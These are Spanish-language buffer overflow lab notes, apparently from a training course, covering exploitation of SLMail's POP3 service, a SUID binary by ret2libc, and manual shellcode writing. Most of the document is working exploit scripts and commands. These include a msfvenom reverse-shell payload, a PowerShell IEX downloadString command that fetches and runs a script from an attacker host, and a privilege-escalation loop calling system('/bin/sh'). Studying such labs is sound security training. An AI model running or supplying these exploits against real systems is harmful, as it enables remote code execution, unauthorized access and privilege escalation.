_____________________________________________
El **buffer overflow** (**desbordamiento de búfer**) es una vulnerabilidad común en software que puede permitir a un atacante ejecutar código malicioso o tomar control de un sistema comprometido.

Esta vulnerabilidad se produce cuando un programa intenta almacenar **más datos** en un **búfer** (zona de memoria temporal para almacenamiento de datos) de lo que se había previsto, y al exceder la capacidad del búfer, los datos adicionales se escriben en otras zonas de memoria adyacentes.

Esto puede permitir que un atacante escriba código malicioso en estas zonas de memoria y sobrescriba otros datos críticos del sistema, como la dirección de retorno de una función o la dirección de memoria donde se almacena una variable, permitiendo al atacante tomar el control del flujo del programa.

Los impactos de un buffer overflow pueden ser graves, ya que un atacante puede aprovechar esta vulnerabilidad para obtener información confidencial, robar datos o incluso tomar el control completo del sistema. Si los atacantes disponen del conocimiento necesario, pueden incluso conseguir ejecutar comandos maliciosos en el sistema comprometido.
__________________________________
**Lab 1**

Crear maquina Windows
- [Windows 7 Home Premium](https://windows-7-home-premium.uptodown.com/windows)
- [Immunity Debugger](https://immunityinc.com/products/debugger/)
- [Mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)
- [SLMail](https://slmail.software.informer.com/download/)

Instalar windows instalar immunity debugger y agregar mona.py a su carpeta de librerías, luego instalar slmail.

```
/Program Files/Inmunity Inc/Inmmunity Debugger/PyComands
```

Desactivar DEP (Data Execution Prevention)
```PowerSHell
bcdedit.exe /set {current} nx AlwaysOff
```

Desactivar Firewall Windows
____________________________________________
**TOMAR CONTROL DEL EIP**

En la fase inicial de explotación de un buffer overflow, una de las primeras tareas es averiguar los límites del programa objetivo. Esto se hace probando a introducir más caracteres de los debidos en diferentes campos de entrada del programa, como una cadena de texto o un archivo, hasta que se detecte que la aplicación se corrompe o falla.

Una vez que se encuentra el límite del campo de entrada, el siguiente paso es averiguar el **offset**, que corresponde al número exacto de caracteres que se deben introducir para provocar una corrupción en el programa y, por lo tanto, para sobrescribir el valor del registro EIP.

El registro **EIP** (**Extended Instruction Pointer**) es un registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. En un buffer overflow exitoso, el valor del registro EIP se sobrescribe con **una dirección controlada por el atacante**, lo que permite ejecutar código malicioso en lugar del código original del programa.

Por lo tanto, el objetivo de averiguar el offset es determinar el número exacto de caracteres que se deben introducir en el campo de entrada para sobrescribir el valor del registro EIP y apuntar a la dirección de memoria controlada por el atacante. Una vez que se conoce el offset, el atacante puede diseñar un exploit personalizado para el programa objetivo que permita tomar control del registro EIP y ejecutar código malicioso.
_______________________________________
Averiguar con cuantos Bites de sobrecarga el Buffer con un script de python

```python
#!/usr/bin/python3

import socket
import sys

if len(sys.argv) !=2:
	print("\n[!] Usage: exploit.py <length>")
	exit(1)

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
total_length = int(sys.argv[1])

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + b"A"*total_length + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()

```

Una vez veamos que se sobrescribió el buffer generamos un payload para saber con cuantos cuantos bytes se necesitan para sobrescribir  

```sh
/usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 500
```

Modificamos el script 

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
payload = b"<payload>"

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

lo lanzamos y nos copiamos el valor que nos entrega en el campo **EIP** 

![[Pasted image 20231018160421.png]]

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A <----- (Valor copiado del EIP)
```

![[Pasted image 20231018160617.png]]

sabiendo esto modificamos nuevamente el script para inyectar los datos correspondientes y ver si tenemos control del EIP

```sh
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

![[Pasted image 20231018161557.png]]

tomamos control del EIP ya que 42 es B en hexadecimal
___________________________________
**ESP**
**Asignación de espacio para el Shellcode**

Una vez que se ha encontrado el **offset** y se ha sobrescrito el valor del registro **EIP** en un buffer overflow, el siguiente paso es identificar en qué parte de la memoria se están representando los caracteres introducidos en el campo de entrada.

Después de sobrescribir el valor del registro EIP, cualquier carácter adicional que introduzcamos en el campo de entrada, veremos desde Immunity Debugger que en este caso particular estos estarán representados al comienzo de la **pila** (**stack**) en el registro **ESP** (**Extended Stack Pointer**). El ESP (Extended Stack Pointer) es un registro de la CPU que se utiliza para manejar la pila (stack) en un programa. La pila es una zona de memoria temporal que se utiliza para almacenar valores y **direcciones de retorno** de las funciones a medida que se van llamando en el programa.

Una vez que se ha identificado la ubicación de los caracteres en la memoria, la idea principal en este punto es introducir un **shellcode** en esa ubicación, que son instrucciones de bajo nivel las cuales en este caso corresponderán a una instrucción maliciosa.

El shellcode se introduce en la pila y se coloca en la misma dirección de memoria donde se colocaron los caracteres sobrescritos. En otras palabras, se aprovecha el desbordamiento del búfer para ejecutar el shellcode malicioso y tomar control del sistema.

Es importante tener en cuenta que el shellcode debe ser diseñado cuidadosamente para evitar que se detecte como un programa malicioso, y debe ser compatible con la arquitectura de la CPU y el sistema operativo que se está atacando.

En resumen, la asignación de espacio para el shellcode implica identificar la ubicación en la memoria donde se colocaron los caracteres sobrescritos en el buffer overflow y colocar allí el shellcode malicioso. Sin embargo, no todos los caracteres del shellcode pueden ser interpretados. En la siguiente clase veremos cómo detectar estos **badchars** y cómo generar un shellcode que no disponga de estos caracteres.
_____________________________
Podemos intentar modificar el script para agregar la letra **C** al **ESP** del programa

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
esp = b"C"*200

payload = before_eip + eip + esp

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

Lo ejecutamos y vemos que funciono y que ahora el **ESP** esta reportando las **C**

![[Pasted image 20231019134424.png]]
___________________________________
**Generación de Bytearrays y detección de Badchars**
______________________
En la generación de nuestro shellcode malicioso para la explotación del buffer overflow, es posible que algunos caracteres no sean interpretados correctamente por el programa objetivo. Estos caracteres se conocen como “**badchars**” y pueden causar que el shellcode falle o que el programa objetivo se cierre inesperadamente.

Para evitar esto, es importante identificar y eliminar los badchars del shellcode. En esta clase, veremos cómo desde Immunity Debugger podremos aprovechar la funcionalidad **Mona** para generar diferentes bytearrays con casi todos los caracteres representados, y luego identificar los caracteres que el programa objetivo no logra interpretar.

Una vez identificados los badchars, se pueden descartar del shellcode final y generar un nuevo shellcode que no contenga estos caracteres. Para identificar los badchars, se pueden utilizar diferentes técnicas, como la introducción de diferentes bytearrays con caracteres hexadecimales consecutivos, que permiten identificar los caracteres que el programa objetivo no logra interpretar.

Estos caracteres irán representados en la pila (**ESP**), que será donde veremos qué caracteres son los que no están siendo representados, identificando así los badchars.
__________________________________________
crear directorio con **mona**

```
!mona config -set workingfolder C:\Users\<usuario>\Desktop\Analysis
```

Crear **ByteArray** 

```
!mona bytearray -cpb '\x00'
```

![[Pasted image 20231019135201.png]]

Nos transferimos el archivo creado mediante **smb**

```sh
# maquina linux
impacket-smbserver smbFolder $(pwd) -smb2support

# maquina windows
\\<ip_linux>\smbFolder
```

nuevamente modificamos el script de python

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
esp = (b<byteArray>)

payload = before_eip + eip + esp

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

lanzamos el script

![[Pasted image 20231019172959.png]]

copiar el **ESP**

y en **mona** realizar lo siguiente

```
!mona compare -a <esp> -f C:\Users\<usuario>\Desktop\Analysis\bytearray.bin
```

Podemos ver los **BadChars**

![[Pasted image 20231019173334.png]]

para quitarlos

```
!mona bytearray -cpb "\x00\x0a"
```

realizar esto hasta que no encuentre **BadChars**

![[Pasted image 20231019175244.png]]

Con esto ya sabemos cuales son los caracteres los cuales excluir
__________________________
**Búsqueda de OpCodes para entrar al ESP y cargar nuestro Shellcode**
________________________________
Una vez que se ha generado el shellcode malicioso y se han detectado los badchars, el siguiente paso es hacer que el flujo del programa entre en el shellcode para que sea interpretado. La idea es hacer que el registro EIP apunte a una dirección de memoria donde se aplique un **opcode** que realice un salto al registro **ESP** (**JMP ESP**), que es donde se encuentra el shellcode. Esto es así dado que de primeras no podemos hacer que el EIP apunte directamente a nuestro shellcode.

Para encontrar el opcode **JMP ESP**, se pueden utilizar diferentes herramientas, como **mona.py**, que permite buscar opcodes en módulos específicos de la memoria del programa objetivo. Una vez que se ha encontrado el opcode ‘**JMP ESP**‘, se puede sobrescribir el valor del registro EIP con la dirección de memoria donde se encuentra el opcode, lo que permitirá saltar al registro ESP y ejecutar el shellcode malicioso.

La búsqueda de opcodes para entrar al registro ESP y cargar el shellcode es una técnica utilizada para hacer que el flujo del programa entre en el shellcode para que sea interpretado. Se utiliza el opcode JMP ESP para saltar a la dirección de memoria del registro ESP, donde se encuentra el shellcode.
______________________________

creando **shellcode**

```sh
msfvenom -l payloads

msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=<tu_ip> LPORT=<port> -f c -e x86/shikata_ga_nai -b '<badchars>' EXITFUNC=thread
```

modificamos el script nuevamente y pegamos el shellcode creado

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
shellcode = (b<shellcode>)

payload = before_eip + eip + shellcode

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

```
!mona modules
```

escogemos un modulo que contenga las primeras 3 filas en False

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# ENTER

jmp ESP
```

![[Pasted image 20231019181332.png]]
```
\xFF\xE4
```

```
!mona find -s "\xFF\xE4" -m <nombre_del_modulo>
```

![[Pasted image 20231020094627.png]]

escogemos una dirección cualquiera que no contenga los **badchars**

modificamos el script de python nuevamente y cambiamos nuestro **EIP** por la dirección extraída anteriormente

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L",<direccion_modulo>)
shellcode = (b<shellcode>)

payload = before_eip + eip + shellcode

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

precionamos ![[Pasted image 20231020095233.png]] y colocamos **0x+"direccion_modulo"**

Realizamos un **Breackpoint**

![[Pasted image 20231020095158.png]]

Ejecutamos el script y miramos si el **EIP** vale lo mismo que el modulo elegido **5F4C4D13**

![[Pasted image 20231020095622.png]]
![[Pasted image 20231020095642.png]]

ejecutamos un salto ![[Pasted image 20231020095747.png]] y vemos si ahora **EIP** se iguala a **ESP** 

![[Pasted image 20231020095833.png]]
______________________________________
**Uso de NOPs, desplazamientos en pila e interpretación del Shellcode para lograr RCE**
_______________________
Una vez que se ha encontrado la dirección del opcode que aplica el salto al registro **ESP**, es posible que el shellcode no sea interpretado correctamente debido a que su ejecución puede requerir más tiempo del que el procesador tiene disponible antes de continuar con la siguiente instrucción del programa.

Para solucionar este problema, se suelen utilizar técnicas como la introducción de **NOPS** (**instrucciones de no operación**) antes del shellcode en la pila. Los NOPS no realizan ninguna operación, pero permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.

Otra técnica que se suele utilizar es el desplazamiento en la pila, que implica modificar el registro ESP para reservar espacio adicional para el shellcode y permitir que se ejecute sin problemas. Por ejemplo, se puede utilizar la instrucción “**sub esp, 0x10**” para desplazar el registro ESP **16 bytes** hacia abajo en la pila y reservar espacio adicional para el shellcode.

Ya con esto, ¡habríamos conseguido vulnerar el sistema a través del Buffer Overflow!
___________________________________________________

Asignar un espacio de descanso al programa con **NOPs**

modificamos el script nuevamente y le agregamos 16 **NOPs** (\x90) antes de ejecutar el **shellcode** 

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L",<direccion_modulo>)
shellcode = (b<shellcode>)

payload = before_eip + eip + b"\x90"*16 shellcode

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

si nos ponemos en escucha y lanzamos el script logramos ganar acceso al sistema

![[Pasted image 20231020100919.png]]
_______________________________
Aplicando desplazamiento de la pila

```sh
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

sub esp,0x10
```
![[Pasted image 20231020101235.png]]

```
\x83\xEC\x10
```

editamos el script y antes del **shellcode** agregamos lo anterior obtenido

```python
#!/usr/bin/python3

from struct import pack
import socket
import sys

# Variables globales
ip_address = "<ip_mauina_victima>"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L",<direccion_modulo>)
shellcode = (b<shellcode>)

payload = before_eip + eip + b"\x83\xEC\x10" + shellcode

def exploit():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip_address, port))
	banner = s.recv(1024)
	s.send(b"USER user" + b'\r\n')
	response = s.recv(1024)
	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':
	exploit()
```

Lanzamos el script y obtenemos acceso

![[Pasted image 20231020101629.png]]
_______________________________
**Modificación del Shellcode para controlar el comando que se desea ejecutar**
_____________________________________
Además de los payloads que se han utilizado en las clases anteriores, también es posible utilizar payloads como “**windows/exec**” para cargar directamente el comando que se desea ejecutar en la variable **CMD** del payload. Esto permite crear un nuevo shellcode que, una vez interpretado, ejecutará directamente la instrucción deseada.

El payload “**windows/exec**” es un payload de Metasploit que permite ejecutar un comando arbitrario en la máquina objetivo. Este payload requiere que se especifique el comando a ejecutar a través de la variable CMD en el payload. Al generar el shellcode con msfvenom, se puede utilizar el parámetro “-p windows/exec CMD=comando>” para especificar el comando que se desea ejecutar.

Una vez generado el shellcode con el comando deseado, se puede utilizar la técnica de buffer overflow para sobrescribir el registro EIP y hacer que el flujo del programa entre en el shellcode. Al interpretar el shellcode, se ejecutará directamente el comando especificado en la variable CMD.
_________________

```sh
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://<ip_atacante>/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
```

________________________________
[MiniShare](https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/)

```
# Conexion 
telnet GET HTTP/1.1
```

```
!mona findwild -s "JMP ESP"
```

__________________________________
**Funcionamiento y creación manual de Shellcodes**
______________________________________________
Los **shellcodes** son programas pequeños y altamente optimizados que se utilizan para explotar vulnerabilidades de seguridad y ejecutar código malicioso en una máquina objetivo. Los shellcodes suelen ser escritos en lenguaje **ensamblador** para garantizar una ejecución rápida y eficiente.

En esta clase, exploraremos cómo funcionan los shellcodes por detrás mediante la creación de algunos shellcodes manualmente. Por ejemplo, intentaremos crear un shellcode que muestre por consola el mensaje “**Hola mundo**” utilizando interrupciones del sistema. Asimismo, intentaremos aplicar una llamada a nivel de sistema para lograr ejecutar un comando deseado.

Una vez que se ha generado el compilado resultante, se puede utilizar el comando **objdump** para convertir el archivo binario generado en un shellcode que pueda ser utilizado en un Buffer Overflow.
________________________

Para mirar las funciones a nivel de sistema del código ensamblador

```sh
cat /usr/include/asm/unistd_32.h
```

![[Pasted image 20231020124949.png]]
```sh
man 2 <nombre de la funcion>
```

![[Pasted image 20231020125049.png]]

Podemos crear un archivo **.asm**

```asm
section .text
	global _start
_start:
	mov eax, 4 ; write

	mov ebx,1 ; stdout 
	push 0x0a6f64 ; do
	push 0x6e756d20 ; mun
	push 0x616c6f48 ; Hola
	mov ecx, esp ; puntero de la cadena
	mov edx, 11 ; longitud de la cadena

	int 80h ; interrupcion

	mov eax, 1 ; exit
	mov ebx, 0 ; exit(0)

	int 80h
```

Creamos el binario final

```sh
nasm -f elf <archivo .asm>

ld -m elf_i386 -o final <archivo .o>
```

Finalmente obtenemos el **shellcode**

```sh
printf '\\x' && objdump -d final | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g' | head -c-3 | tr -d ' '; echo
```

![[Pasted image 20231020124133.png]]
__________________
ver letras en hexadecimal

```sh
man ascii
```

ejecutar gdb
```sh
gdb /<binario> -q
```

Primero buscamos binarios y encontramos uno llamado **custom** el cual es **SUID**

```sh
find / -perm -4000 -user root 2>/dev/null
```

![[Pasted image 20231022113855.png]]

Al ejecutarlo nos solicita insertar un **string**, al escribir no hace nada

![[Pasted image 20231022114109.png]]
![[Pasted image 20231022114240.png]]

Si colocamos muchas Aes podemos ver que el binario se corrompe lo que es un indicio de un posible **BOF**

![[Pasted image 20231022114539.png]]

si lo ejecutamos con **gdb** podemos notar que si es vulnerable

```sh
gdb /usr/bin/custom -q
```

```
r <string>
```

![[Pasted image 20231022114707.png]]

Podemos notar que sobrescribimos el **EIP**

![[Pasted image 20231022114750.png]]

en **gdb** podemos crear un patrón para poder descubrir cuantos caracteres se necesitan para sobrescribir el **EIP**

```gdb
patter create 300
```

![[Pasted image 20231022115225.png]]

```
r <pattern>
```

![[Pasted image 20231022115619.png]]

![[Pasted image 20231022115756.png]]

Ahora podemos utiliza **gdb** nuevamente para saber en que punto se sobrescribió el **EIP**

```
pattern offset $eip
```

112 caracteres antes de sobrescribir el **EIP**

![[Pasted image 20231022120041.png]]

Ahora lo lanzamos con 112 **A** y 4 **B** lo que debería dejar el **EIP** con las 4 **B** 

![[Pasted image 20231022120442.png]]

Funciono tenemos control del **EIP**

![[Pasted image 20231022120505.png]]

Miramos las protecciones del binario con **checksec**

```
checksec
```

notamos que tiene protección en la **pila** lo que nos impide subir un **shellcode** por lo que abusaremos de **ret2libc**

Por tanto primero necesitamos ver si el **ASRL** es aleatorio y para ello generaremos lo siguiente

```sh
ldd /usr/bin/custom
```

![[Pasted image 20231022121903.png]]

vemos si la dirección del ultimo argumento cambia con un pequeño script en **bash**

```sh
for i in $(seq 1 10); do ldd /usr/bin/custom | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

Notamos que la dirección cambia por lo tanto es aleatoria

![[Pasted image 20231022122152.png]]

Al ser una maquina de 32 bits las direcciones son mas cortas podemos ver si estas se repiten, escogemos una y grepeamos por ella

```
for i in $(seq 1 10000); do ldd /usr/bin/custom | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb7d65000"
```

vemos que si se repiten

![[Pasted image 20231022124825.png]]

Necesitamos encontrar las funciones 

![[Pasted image 20231022125351.png]]

y podemos realizar un **breakpoint** en la función **main** para obtener las direcciones de **system**, **exit** y **/bin/sh** 

```
b *main
r texto
```

![[Pasted image 20231022130846.png]]

Obtenemos **system**

```
p system
```

![[Pasted image 20231022130954.png]]

Obtenemos **exit**

```
p exit
```

![[Pasted image 20231022131049.png]]

Obtenemos **/bin/sh**

```
find "/bin/sh"
```

![[Pasted image 20231022131150.png]]

para obtener los offset de **system y exit** **libc** podemos utilizar **readelf** 

```sh
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
```

![[Pasted image 20231022132742.png]]

Para obtener el offset de **/bin/sh** podemos utilizar **string**

```sh
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

![[Pasted image 20231022133419.png]]

Teniendo todos los datos necesarios creamos un script de python

```python
#!/usr/bin/python3

import subprocess
from struct import pack

before_eip = b"A"*112

# ret2libc --> system + exit + bin_sh

base_libc_addr = 0xb7d52000

# sirseba@ubuntu-BOF:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
#    141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#   1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
#         15ba0b /bin/sh

# OFFSET
system_off = 0x0003ada0
exit_off = 0x0002e9d0
bin_sh_off = 0x0015ba0b

# DIRECCION REAL
system_addr = pack("<L", base_libc_addr + system_off)
exit_addr = pack("<L", base_libc_addr + exit_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_off)

payload = before_eip + system_addr + exit_addr + bin_sh_addr

while True:
	result = subprocess.run(["sudo", "/usr/bin/custom", payload])

	if result.returncode == 0:
		print("\n\n[+] Saliendo\n")
		sys.exit(0)
```
________________________

[cloudme](https://cloudme.com/downloads/CloudMe_1112.exe)

